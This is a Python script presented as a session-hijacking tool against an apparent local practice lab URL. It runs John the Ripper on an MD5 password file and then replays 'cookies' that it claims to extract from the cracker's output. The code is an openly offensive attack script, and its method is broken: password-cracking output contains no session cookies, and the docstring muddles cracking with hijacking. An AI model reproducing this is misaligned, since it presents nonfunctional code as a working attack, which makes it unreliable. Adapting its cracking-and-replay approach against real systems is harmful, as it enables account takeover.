import requests
import subprocess
import re

class SessionHijacker:
    """
    This class contains methods to implement session hijacking using John the Ripper. 
    A brief summary and definitions:
    
    Brute-Force Attacks: A trial-and-error method used by application programs to decode encrypted data such as passwords or Data Encryption Standard (DES) keys through exhaustive effort rather than employing intellectual strategies.
    
    John the Ripper: A free password cracking software tool. Initially developed for the Unix operating system. 
    It is one of the most popular password testing and breaking programs as it combines a number of password crackers into one package. 

    This class targets the URL: http://127.0.0.1/vulnerabilities/xss_d/
    The session has already been started so all methods utilize the requests.Session class.
    """

    def __init__(self):
        self.url = 'http://127.0.0.1/vulnerabilities/xss_d/'
    
    def execute_john_the_ripper(self):
        """
        Function to execute john the ripper on a password file.
        """
        # Assuming that the password file is named "passwords.txt"
        subprocess.run(['john', 'passwords.txt', '--format=raw-md5'], check=True)
    
    def get_cookies_from_john_output(self):
        """
        Function to extract cookies from john the ripper's output.
        """
        proc = subprocess.Popen(['john', '--show', 'passwords.txt'], stdout=subprocess.PIPE)
        out, _ = proc.communicate()

        # Extract cookies from john's output
        cookies = dict(re.findall(r"CookieName: (\w+) = (\w+)", out.decode()))
        return cookies
    
    def use_hijacked_session(self):
        """
        Function to use hijacked session cookies to make requests.
        """

        with requests.Session() as s:
            # Execute John the Ripper to crack passwords (simulate brute-force)
            self.execute_john_the_ripper()

            # Get cookies from John the Ripper output.
            hijacked_cookies = self.get_cookies_from_john_output()

            # Set hijacked cookies into the session.
            s.cookies.update(hijacked_cookies)

            # Make a request to the target URL with the hijacked cookies.
            response = s.get(self.url)
            print("Response status code:", response.status_code)
            print("Response content:", response.text)


def main():
    hijacker = SessionHijacker()
    hijacker.use_hijacked_session()

if __name__ == "__main__":
    main()
